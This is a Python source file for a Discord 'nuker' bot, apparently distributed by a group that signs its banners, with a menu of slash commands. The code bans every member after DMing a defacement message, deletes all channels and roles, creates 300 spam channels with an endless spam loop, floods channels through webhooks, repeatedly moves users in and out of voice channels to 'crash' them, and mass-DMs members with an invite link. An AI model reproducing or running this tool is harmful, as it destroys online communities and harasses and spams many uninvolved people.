import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import random
import time
import aiohttp
import json

# ============================================
# CONFIG
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Voice crash tracking
running_crashes = {}

# ============================================
# MESSAGES
# ============================================
HAQ_MESSAGE = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ ║
║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗║
║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║║
║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║║
║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║║
║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝║
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
║                    YOU HAVE BEEN TERMINATED BY                                ║
║                    HAQ MASHA & VON KATIBA TEAM                                ║
║                                                                               ║
║                    https://discord.gg/c7cgYk4V                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

SPAM_LIST = [
    "@everyone **HAQ MASHA VON KATIBA TEAM DESTROYED THIS SERVER**",
    "```VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH```",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```HAQ MASHA + VON KATIBA = MAXIMUM DESTRUCTION```",
    "**الكتيبة هاق مشا تيم - VON KATIBA**",
    "@everyone **YOUR SERVER IS GONE FOREVER**",
    "```VON KATIBA WAS HERE```",
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
]

# ============================================
# EMBED MENU
# ============================================
def create_main_menu():
    embed = discord.Embed(
        title="🎯 HAQ MASHA VON KATIBA NUKER PANEL",
        description="**Select an option from the menu below**",
        color=discord.Color.red()
    )
    embed.add_field(
        name="📁 1️⃣ `/nuke`",
        value="```Destroy entire server (ban all, delete channels, create spam)```",
        inline=False
    )
    embed.add_field(
        name="💬 2️⃣ `/spam`",
        value="```Spam messages in current channel```",
        inline=False
    )
    embed.add_field(
        name="🪝 3️⃣ `/webhook`",
        value="```Create webhooks and spam from them```",
        inline=False
    )
    embed.add_field(
        name="🎧 4️⃣ `/crash`",
        value="```Crash users via voice channels (join/leave spam)```",
        inline=False
    )
    embed.add_field(
        name="📢 5️⃣ `/otf`",
        value="```Send a custom message to all members in DM```",
        inline=False
    )
    embed.add_field(
        name="🛑 6️⃣ `/stop`",
        value="```Stop all ongoing spam/crash operations```",
        inline=False
    )
    embed.set_footer(text="HAQ MASHA VON KATIBA TEAM | ALGERIA")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/.../icon.png")
    return embed

# ============================================
# COMMAND: /v (MENU)
# ============================================
@bot.tree.command(name="v", description="Show the main nuker menu")
async def slash_v(interaction: discord.Interaction):
    embed = create_main_menu()
    await interaction.response.send_message(embed=embed, ephemeral=False)

# ============================================
# COMMAND: /nuke (FULL SERVER DESTROY)
# ============================================
@bot.tree.command(name="nuke", description="Destroy the entire server")
@app_commands.describe(target="Choose what to destroy")
@app_commands.choices(target=[
    app_commands.Choice(name="Everything (Bans + Channels + Roles)", value="full"),
    app_commands.Choice(name="Only Channels", value="channels"),
    app_commands.Choice(name="Only Roles", value="roles"),
    app_commands.Choice(name="Only Members (Ban all)", value="bans"),
])
async def slash_nuke(interaction: discord.Interaction, target: app_commands.Choice[str]):
    await interaction.response.defer()
    guild = interaction.guild
    
    embed = discord.Embed(title="💀 NUKE STARTED 💀", color=discord.Color.red())
    embed.add_field(name="Target", value=target.name, inline=False)
    embed.add_field(name="Server", value=guild.name, inline=True)
    await interaction.followup.send(embed=embed)
    
    # Get first channel for updates
    first_channel = guild.text_channels[0] if guild.text_channels else None
    
    # BAN ALL MEMBERS
    if target.value in ["full", "bans"]:
        members = await guild.fetch_members().flatten()
        banned = 0
        for member in members:
            if not member.bot:
                try:
                    await member.send(HAQ_MESSAGE)
                    await member.ban(reason="HAQ MASHA VON KATIBA")
                    banned += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
        if first_channel:
            await first_channel.send(f"✅ BANNED {banned} MEMBERS")
    
    # DELETE ALL CHANNELS
    if target.value in ["full", "channels"]:
        deleted = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted += 1
                await asyncio.sleep(0.02)
            except:
                pass
        if first_channel:
            await first_channel.send(f"✅ DELETED {deleted} CHANNELS")
    
    # DELETE ALL ROLES
    if target.value in ["full", "roles"]:
        deleted = 0
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    deleted += 1
                    await asyncio.sleep(0.02)
                except:
                    pass
        if first_channel:
            await first_channel.send(f"✅ DELETED {deleted} ROLES")
    
    # CHANGE SERVER NAME
    if target.value == "full":
        await guild.edit(name="VON KATIBA HAQ MASHA")
    
    # CREATE NEW CHANNELS
    if target.value == "full":
        for i in range(300):
            try:
                await guild.create_text_channel(name=f"von-katiba-{i}")
                await asyncio.sleep(0.01)
            except:
                pass
        
        # Start spam in new channels
        async def spam():
            while True:
                for ch in guild.text_channels:
                    try:
                        await ch.send(random.choice(SPAM_LIST))
                        await asyncio.sleep(0.05)
                    except:
                        pass
                await asyncio.sleep(0.1)
        asyncio.create_task(spam())
    
    await interaction.followup.send("✅ **NUKE COMPLETED!**")

# ============================================
# COMMAND: /spam
# ============================================
@bot.tree.command(name="spam", description="Spam messages in current channel")
@app_commands.describe(
    channel="Channel to spam (leave empty for current)",
    count="Number of messages to send (default: 100)",
    delay="Delay between messages in seconds (default: 0.1)"
)
async def slash_spam(
    interaction: discord.Interaction, 
    channel: discord.TextChannel = None,
    count: int = 100,
    delay: float = 0.1
):
    await interaction.response.defer()
    target_channel = channel or interaction.channel
    
    embed = discord.Embed(title="💬 SPAM STARTED", color=discord.Color.orange())
    embed.add_field(name="Channel", value=target_channel.mention, inline=True)
    embed.add_field(name="Count", value=str(count), inline=True)
    embed.add_field(name="Delay", value=f"{delay}s", inline=True)
    await interaction.followup.send(embed=embed)
    
    sent = 0
    for i in range(count):
        try:
            await target_channel.send(random.choice(SPAM_LIST))
            sent += 1
            await asyncio.sleep(delay)
        except:
            pass
    
    await interaction.followup.send(f"✅ **SENT {sent} MESSAGES**")

# ============================================
# COMMAND: /webhook
# ============================================
@bot.tree.command(name="webhook", description="Create webhooks and spam")
@app_commands.describe(
    channel="Channel to create webhooks in",
    count="Number of webhooks to create (default: 10)",
    spam_count="Number of spam messages per webhook (default: 100)"
)
async def slash_webhook(
    interaction: discord.Interaction,
    channel: discord.TextChannel,
    count: int = 10,
    spam_count: int = 100
):
    await interaction.response.defer()
    
    embed = discord.Embed(title="🪝 WEBHOOK SPAM STARTED", color=discord.Color.purple())
    embed.add_field(name="Channel", value=channel.mention, inline=True)
    embed.add_field(name="Webhooks", value=str(count), inline=True)
    embed.add_field(name="Messages/Webhook", value=str(spam_count), inline=True)
    await interaction.followup.send(embed=embed)
    
    webhooks = []
    for i in range(min(count, 10)):
        try:
            webhook = await channel.create_webhook(name=f"HAQ-MASHA-{i}")
            webhooks.append(webhook)
            await asyncio.sleep(0.1)
        except:
            pass
    
    async with aiohttp.ClientSession() as session:
        for webhook in webhooks:
            for i in range(spam_count):
                try:
                    data = {
                        "content": random.choice(SPAM_LIST),
                        "username": random.choice(["VON-KATIBA", "HAQ-MASHA", "NUKER"])
                    }
                    async with session.post(webhook.url, json=data) as resp:
                        pass
                    await asyncio.sleep(0.05)
                except:
                    pass
    
    await interaction.followup.send(f"✅ **SPAMMED {len(webhooks)} WEBHOOKS**")

# ============================================
# COMMAND: /crash (VOICE CRASHER)
# ============================================
@bot.tree.command(name="crash", description="Crash users via voice channels")
@app_commands.describe(
    target="Who to crash",
    voice_channel="Voice channel to use",
    interval="Delay between joins (seconds)",
    iterations="Number of join/leave cycles"
)
@app_commands.choices(target=[
    app_commands.Choice(name="All Members", value="all"),
    app_commands.Choice(name="Specific User (provide ID)", value="user"),
])
async def slash_crash(
    interaction: discord.Interaction,
    target: app_commands.Choice[str],
    voice_channel: discord.VoiceChannel,
    interval: float = 0.1,
    iterations: int = 100
):
    await interaction.response.defer()
    guild = interaction.guild
    
    embed = discord.Embed(title="🎧 VOICE CRASH STARTED", color=discord.Color.red())
    embed.add_field(name="Target", value=target.name, inline=True)
    embed.add_field(name="Voice Channel", value=voice_channel.name, inline=True)
    embed.add_field(name="Interval", value=f"{interval}s", inline=True)
    embed.add_field(name="Iterations", value=str(iterations), inline=True)
    await interaction.followup.send(embed=embed)
    
    async def crash_user(member):
        for i in range(iterations):
            if member.id in running_crashes and not running_crashes[member.id]:
                break
            try:
                await member.move_to(voice_channel)
                await asyncio.sleep(interval)
                await member.move_to(None)
                await asyncio.sleep(interval)
            except:
                pass
    
    if target.value == "all":
        members = [m for m in guild.members if not m.bot]
        crashed = 0
        for member in members:
            try:
                asyncio.create_task(crash_user(member))
                crashed += 1
                await asyncio.sleep(0.1)
            except:
                pass
        await interaction.followup.send(f"✅ **CRASHING {crashed} USERS**")
    else:
        await interaction.followup.send("📢 **Please provide user ID in chat**")
        # Would need more logic for specific user

# ============================================
# COMMAND: /otf (SEND DM TO ALL MEMBERS)
# ============================================
@bot.tree.command(name="otf", description="Send a custom message to all members in DM")
@app_commands.describe(
    message="The message you want to send to all members"
)
async def slash_otf(interaction: discord.Interaction, message: str):
    await interaction.response.defer(ephemeral=True)
    guild = interaction.guild
    
    embed = discord.Embed(
        title="📢 OTF - MASS DM STARTED",
        description=f"**Message:** {message[:100]}...",
        color=discord.Color.blue()
    )
    embed.add_field(name="Server", value=guild.name, inline=True)
    embed.add_field(name="Members", value=str(len([m for m in guild.members if not m.bot])), inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)
    
    members = await guild.fetch_members().flatten()
    sent = 0
    failed = 0
    
    for member in members:
        if not member.bot and member != interaction.user:
            try:
                full_message = f"**HAQ MASHA VON KATIBA TEAM**\n{message}\n\nhttps://discord.gg/c7cgYk4V"
                await member.send(full_message)
                sent += 1
                await asyncio.sleep(0.2)
            except:
                failed += 1
    
    result_embed = discord.Embed(
        title="✅ OTF COMPLETED",
        description=f"**Sent:** {sent} members\n**Failed:** {failed} members",
        color=discord.Color.green()
    )
    await interaction.followup.send(embed=result_embed)

# ============================================
# COMMAND: /stop
# ============================================
@bot.tree.command(name="stop", description="Stop all ongoing spam/crash operations")
async def slash_stop(interaction: discord.Interaction):
    global running_crashes
    running_crashes = {}
    await interaction.response.send_message("🛑 **ALL OPERATIONS STOPPED**", ephemeral=True)

# ============================================
# ON READY
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ✅ BOT ONLINE: {bot.user.name}
║              ✅ BOT ID: {bot.user.id}
║              ✅ SERVERS: {len(bot.guilds)}
║                                                                               ║
║              📌 SLASH COMMANDS REGISTERED:
║                 • /v      - Main menu
║                 • /nuke   - Destroy server
║                 • /spam   - Spam messages
║                 • /webhook - Webhook spam
║                 • /crash  - Voice crash users
║                 • /otf    - Mass DM all members
║                 • /stop   - Stop all operations
║                                                                               ║
║                    VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                    ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    await bot.tree.sync()
    print("[✓] SLASH COMMANDS SYNCED GLOBALLY")

# ============================================
# RUN
# ============================================
bot.run(TOKEN)
